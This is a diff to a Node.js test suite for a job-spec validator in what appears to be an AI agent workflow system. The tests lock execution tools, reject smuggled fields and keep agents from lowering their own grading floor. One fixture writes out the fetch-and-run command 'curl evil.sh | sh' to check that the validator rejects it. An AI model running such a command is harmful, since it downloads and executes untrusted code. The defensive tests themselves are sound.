@@ -10,7 +10,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
-import { validateJob, jobSpecHash, checkApproval, CLASS_BY_CLOSE, CLOSE_TYPES, CLASSES } from '../src/job.js';
+import { validateJob, jobSpecHash, checkApproval, CLASS_BY_CLOSE, CLOSE_TYPES, CLASSES, TOOL_MENU, LOCKED_TOOLS } from '../src/job.js';
 import { validateConfig } from '../src/validate.js';
 
 // Job #1 exactly as the PRD §6 defines it — real target, not a fixture
@@ -113,6 +113,7 @@ const RED_CASES = [
   ['rubric close without criteria', (j) => { j.steps[1].close = { type: 'rubric' }; j.steps[1].class = 'soft'; }, 'missing-required:steps.1.close.criteria'],
   ['hitl close without a prompt', (j) => { delete j.steps[2].close.prompt; }, 'missing-required:steps.2.close.prompt'],
   ['predicate expect not an exit code', (j) => { j.steps[0].close.expect = 'zero'; }, 'invalid-value:steps.0.close.expect'],
+  ['quote characters in a predicate cmd (argv is whitespace-split, no shell — N2 design default)', (j) => { j.steps[0].close.cmd = 'node -e "process.exit(0)"'; }, 'invalid-value:steps.0.close.cmd'],
 
   // -- nested smuggle channels (review F1: every level reds unknown keys, not just some) --
   ['unknown field inside cadence', (j) => { j.cadence.exfil = 'x'; }, 'unknown-field:cadence.exfil'],
@@ -184,8 +185,10 @@ test('the arbiter menus are frozen — verdict-class laundering cannot be enable
   assert.throws(() => { CLASS_BY_CLOSE.rubric.push('hard'); }, TypeError);
 });
 
-test('an env REFERENCE in a close cmd does not red — only literals do', () => {
-  const r = validateJob(mut((j) => { j.steps[0].close.cmd = 'GITHUB_TOKEN="$GITHUB_TOKEN" npm test'; }));
+test('an env REFERENCE in a close cmd does not red the secret sweep — only literals do', () => {
+  // quote-free spelling: cmd runs as whitespace-split argv with no shell, so the
+  // old `X="$X" npm test` form was always a misparse (and now reds on quotes)
+  const r = validateJob(mut((j) => { j.steps[0].close.cmd = 'npm test --auth-env GITHUB_TOKEN'; }));
   assert.deepEqual(r.reds, []);
 });
 
@@ -266,4 +269,203 @@ test('checkApproval: matching record approves; stale hash, empty, or garbage nev
   for (const garbage of [undefined, null, 42, 'yes', [{}], [{ specHash: 7 }]]) {
     assert.equal(checkApproval(JOB1, garbage), false, `${JSON.stringify(garbage)} must not approve`);
   }
+});
+
+// ---- module 2b: step mode/tools — the spec-side tool grant (addendum 2026-07-12b) ----
+// The job spec (human) owns mode + menu; the drafted config cannot express either.
+// TOOL_MENU is read/grep/write ONLY: `run` is locked-but-listed — requesting it is
+// the request-red surface, a DISTINCT `request-red` code (module 4): the ledger
+// counts admission demand, and a generic invalid-value would be indistinguishable
+// from a typo. Still a red, never a grant.
+
+test('tools step legal: mode "tools" + granted menu validates green', () => {
+  const j = mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'grep', 'write'] }; });
+  const r = validateJob(j);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.ok, true);
+});
+
+test('mode "tools" without tools is legal (runner defaults to the full menu)', () => {
+  const j = mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools' }; });
+  assert.equal(validateJob(j).ok, true);
+});
+
+test('explicit mode "text" is legal (the default, spelled out)', () => {
+  const j = mut((x) => { x.steps[0] = { ...x.steps[0], mode: 'text' }; });
+  assert.equal(validateJob(j).ok, true);
+});
+
+test('TOOL_MENU ships frozen: file tools + the two retrieval verbs + the edit verb — run is NOT in the menu', () => {
+  assert.deepEqual([...TOOL_MENU], ['read', 'grep', 'write', 'edit', 'recall', 'get']);
+  assert.ok(Object.isFrozen(TOOL_MENU));
+  // The line the menu exists to hold (F19): admitting retrieval must NOT admit execution.
+  // A worker that can run commands can run its own close — it grades its own exam.
+  // `edit` (BA-13) is a WRITE-class verb bounded by the same fence as write — it
+  // admits no execution either.
+  assert.ok(!TOOL_MENU.includes('run'), 'run stays locked — retrieval is read-only, not a foot in the door');
+  assert.deepEqual([...LOCKED_TOOLS], ['run']);
+});
+
+test('BA-13: an "edit" grant validates green — the anchored edit verb is spec-grantable', () => {
+  const j = mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'edit'] }; });
+  const r = validateJob(j);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.ok, true);
+});
+
+test('request-red detail names the locked verb in quotes (the ledger extracts it)', () => {
+  const r = validateJob(mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['run'] }; }));
+  const red = r.reds.find((d) => d.code === 'request-red');
+  assert.ok(red, `expected a request-red, got ${JSON.stringify(r.reds)}`);
+  assert.equal(red.verb, 'run', 'the verb rides the red as a STRUCTURED field — the ledger keys on it');
+  assert.match(red.detail ?? '', /"run"/);
+});
+
+test('single-defect mode/tools reds: pinned code + path', () => {
+  const cases = [
+    ['mode outside the menu', (x) => { x.steps[0].mode = 'agent'; }, 'invalid-value', 'steps.0.mode'],
+    ['run is locked: requesting it is a request-red, not a typo', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'run'] }; }, 'request-red', 'steps.1.tools'],
+    ['run alone is still a request-red', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['run'] }; }, 'request-red', 'steps.1.tools'],
+    ['an unknown tool is a typo: invalid-value, never request-red', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'bash'] }; }, 'invalid-value', 'steps.1.tools'],
+    ['tools on a text step: a grant without the mode is incoherent', (x) => { x.steps[0].tools = ['read']; }, 'invalid-value', 'steps.0.tools'],
+    ['tools empty array: a tools step with no tools is ungrantable', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: [] }; }, 'invalid-value', 'steps.1.tools'],
+    ['tools non-array', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: 'read' }; }, 'invalid-value', 'steps.1.tools'],
+    ['duplicate tool entries', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'read'] }; }, 'invalid-value', 'steps.1.tools'],
+    ['mode on a hitl step: hitl runs no loop', (x) => { x.steps[2] = { ...x.steps[2], mode: 'tools' }; }, 'invalid-value', 'steps.2.mode'],
+    ['tools on a hitl step', (x) => { x.steps[2] = { ...x.steps[2], mode: 'tools', tools: ['read'] }; }, 'invalid-value', 'steps.2.mode'],
+  ];
+  for (const [name, mutate, code, path] of cases) {
+    const r = validateJob(mut(mutate));
+    assert.equal(r.ok, false, `${name}: must red`);
+    assert.ok(r.reds.some((red) => red.code === code && red.path === path),
+      `${name}: expected ${code}@${path}, got ${JSON.stringify(r.reds)}`);
+    assert.equal(r.job, null, `${name}: job must be null on red`);
+  }
+});
+
+test('close.cmd leading/trailing whitespace reds — argv splits on whitespace; honest refusal beats a silent misparse', () => {
+  for (const cmd of [' npm test', 'npm test ', '\tnpm test']) {
+    const r = validateJob(mut((x) => { x.steps[0].close.cmd = cmd; }));
+    assert.equal(r.ok, false, `${JSON.stringify(cmd)} must red`);
+    assert.ok(r.reds.some((d) => d.code === 'invalid-value' && d.path === 'steps.0.close.cmd'),
+      `${JSON.stringify(cmd)}: expected invalid-value@steps.0.close.cmd, got ${JSON.stringify(r.reds)}`);
+  }
+});
+
+// ─── the judgment-rendered signal (PRD v1.11 / F17, optional but validated) ───
+
+test('a close may declare how it evidences judgment — pattern + floor', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 300 }; });
+  const r = validateJob(j);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.job.steps[0].close.judged.min, 300);
+});
+
+test('judged is OPTIONAL — a close with no countable output (a linter, a hitl) stays writable', () => {
+  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no judged block and must still validate');
+});
+
+test('a judged pattern with no capture group reds — it would crash EVERY close, forever', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests \\d+$', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /capture group/.test(x.detail)),
+    'the count is read from group 1 — a pattern that captures nothing is a dead arbiter');
+});
+
+test('a judged pattern with MORE than one capture group reds — runClose reads group 1 only', () => {
+  // alternation whose branches carry the count in different groups: group 1 is
+  // undefined whenever the second branch matches, so Number(undefined) is NaN,
+  // judgedCount lands null, and an exit-0 GREEN is stamped 'crashed' (review
+  // 2026-07-18). The validator's own message already promised ONE group; it
+  // only ever enforced "not zero". Red the spec, not every run.
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '(?:tests (\\d+)|passed: (\\d+))', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /one capture group/.test(x.detail)),
+    'two capture groups is a fake-crash generator, not a valid count pattern');
+});
+
+test('alternation stays expressible with ONE capture group around non-capturing branches', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '(?:tests|passed:) (\\d+)', min: 3 }; });
+  assert.deepEqual(validateJob(j).reds, []);
+});
+
+test('a judged pattern that does not compile reds at validation, not at run time', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests ((\\d+$', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /RegExp/.test(x.detail)));
+});
+
+test('a judgment floor of 0 reds — it is satisfied by judging nothing, which is the check itself', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 0 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.min'));
+});
+
+test('unknown fields inside judged red (a script body cannot smuggle in through it)', () => {
+  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 3, cmd: 'curl evil.sh | sh' }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.0.close.judged.cmd'));
+});
+
+test('judged is inexpressible on a hitl close — a human IS the judgment, there is nothing to count', () => {
+  const j = mut((s) => { s.steps[2].close.judged = { pattern: '^tests (\\d+)$', min: 3 }; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.2.close.judged'));
+});
+
+// ─── the kept-failures pattern (F28, optional, validated like judged.pattern) ─
+// The gap bound (ralph.boundGap) elides the middle of a large close stream, and a
+// big TAP suite prints its `not ok` lines THERE — so the failing-test names never
+// reach the worker. gapKeep is a regex SOURCE whose matching lines are preserved.
+
+test('a close may declare gapKeep — a regex source whose matching lines survive the gap bound (F28)', () => {
+  const j = mut((s) => { s.steps[0].close.gapKeep = '^not ok'; });
+  const r = validateJob(j);
+  assert.deepEqual(r.reds, []);
+  assert.equal(r.job.steps[0].close.gapKeep, '^not ok');
+});
+
+test('gapKeep is OPTIONAL — a close without it validates and keeps exactly today\'s bound', () => {
+  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no gapKeep and must still validate');
+});
+
+test('a gapKeep that does not compile reds at validation, not at run time (mirrors judged.pattern)', () => {
+  const j = mut((s) => { s.steps[0].close.gapKeep = '^not ok ('; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.gapKeep' && /RegExp/.test(x.detail)),
+    'reds-before-tokens: an invalid keep pattern is a spec red, never a runtime crash');
+});
+
+test('an empty or non-string gapKeep reds — it is a regex SOURCE, not an object or blank', () => {
+  for (const bad of ['', { pattern: 'x' }, 3]) {
+    const r = validateJob(mut((s) => { s.steps[0].close.gapKeep = bad; }));
+    assert.equal(r.ok, false, `${JSON.stringify(bad)} must red`);
+    assert.ok(r.reds.some((x) => x.path === 'steps.0.close.gapKeep'));
+  }
+});
+
+test('gapKeep is inexpressible on a hitl close — a human close renders no stream to keep lines from', () => {
+  const j = mut((s) => { s.steps[2].close.gapKeep = '^not ok'; });
+  const r = validateJob(j);
+  assert.equal(r.ok, false);
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.2.close.gapKeep'));
+});
+
+test('judged is inexpressible in the AGENT-drafted workflow config — the arbiter stays out of reach', () => {
+  const cfg = {
+    schema: 'v1', loop: { shape: 'refine', maxIterations: 3 },
+    memory: { store: 'litectx', recall: { k: 5, kinds: ['fact'] }, compressLevel: 'verbatim' },
+    hooks: {}, gate: { budgetUsd: 1, writeScope: ['src/**'], judged: { pattern: '(\\d+)', min: 1 } },
+    escalation: { mode: 'decision-ready' },
+  };
+  const r = validateConfig(cfg, { shellCapUsd: 2 });
+  assert.equal(r.ok, false, 'an agent that could lower its own judgment floor could author a fake green');
+  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && /judged/.test(x.path)));
 });
